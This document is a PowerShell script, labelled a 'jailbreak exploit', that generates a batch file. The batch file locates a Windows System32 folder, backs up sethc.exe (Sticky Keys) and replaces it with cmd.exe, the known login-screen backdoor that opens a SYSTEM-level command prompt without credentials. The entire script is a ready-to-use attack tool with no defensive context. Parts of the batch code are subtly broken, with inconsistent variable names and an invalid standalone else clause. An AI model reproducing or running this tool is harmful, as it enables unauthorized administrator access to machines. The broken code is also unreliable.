# Jailbreak exploit Windows CMD Administrator

Clear-Host



$host.UI.RawUI.WindowTitle = "Jailbreak exploit Windows CMD Administrator"

write-host "Jailbreak exploit Windows CMD Administrator"
$payload = Read-Host "Construct payload? (y/n)"
if ($payload -eq "y") {
    write-host "Constructing payload..."
    'cls' > payload.bat
    'goto select' >> payload.bat
    ':menu' >> payload.bat
    'echo System Payload' >> payload.bat
    'echo.' >> payload.bat
    'echo Inject Destination %WINPAYLOADIR%' >> payload.bat
    'echo.' >> payload.bat
    'echo Select an option:' >> payload.bat
    'echo 1: Inject Payload Now' >> payload.bat
    'echo 2: Select destination' >> payload.bat
    'echo 3: List all drives' >> payload.bat
    'echo 4: exit' >> payload.bat
    'set /p option=Option: ' >> payload.bat
    'if %option%==1 goto inject' >> payload.bat
    'if %option%==2 goto select' >> payload.bat
    'if %option%==3 goto list' >> payload.bat
    'if %option%==4 goto exit' >> payload.bat
    'echo Invalid option' >> payload.bat
    'pause' >> payload.bat
    'cls' >> payload.bat
    'goto menu' >> payload.bat
    ':inject' >> payload.bat
    'echo Injecting payload...' >> payload.bat
    'echo Destination: %WINPAYLOADIR' >> payload.bat
    'echo.' >> payload.bat
    'cd %WINPAYLOADDIR%' >> payload.bat
    'move sethc.exe sethc.exe.bak' >> payload.bat
    'copy cmd.exe sethc.exe' >> payload.bat
    'echo.' >> payload.bat
    'echo Payload injected!' >> payload.bat
    'pause' >> payload.bat
    'exit' >> payload.bat
    ':select' >> payload.bat
    'if exist D:\Windows\System32\sethc.exe (' >> payload.bat
    'echo Windows directory detected at D:\Windows' >> payload.bat
    'set WINPAYLOADIR=D:\Windows\System32' >> payload.bat
    ')' >> payload.bat
    'if exist C:\Windows\System32\sethc.exe (' >> payload.bat
    'echo Windows directory detected at C:\Windows' >> payload.bat
    'set WINPAYLOADIR=C:\Windows\System32' >> payload.bat
    ')' >> payload.bat
    'else (' >> payload.bat
    'echo Windows directory not found' >> payload.bat
    'wmic logicaldisk get name, volumename, description' >> payload.bat
    'set /p WINPAYLOADIRp=Enter Device Letter: ' >> payload.bat
    'set WINPAYLOADIR=%WINPAYLOADIRp%:\Windows\System32' >> payload.bat
    ')' >> payload.bat
    'cls' >> payload.bat
    'goto menu' >> payload.bat
    ':list' >> payload.bat
    'wmic logicaldisk get name, volumename, description' >> payload.bat
    'goto menu' >> payload.bat
    ':exit' >> payload.bat
    'exit' >> payload.bat
    write-host "Payload constructed!" -ForegroundColor Green
    write-host "Payload saved as payload.bat"
    write-host "Payload location: $pwd\payload.bat"
    Pause
    exit
    
}
else {
    write-host "Payload construction aborted"
    exit
}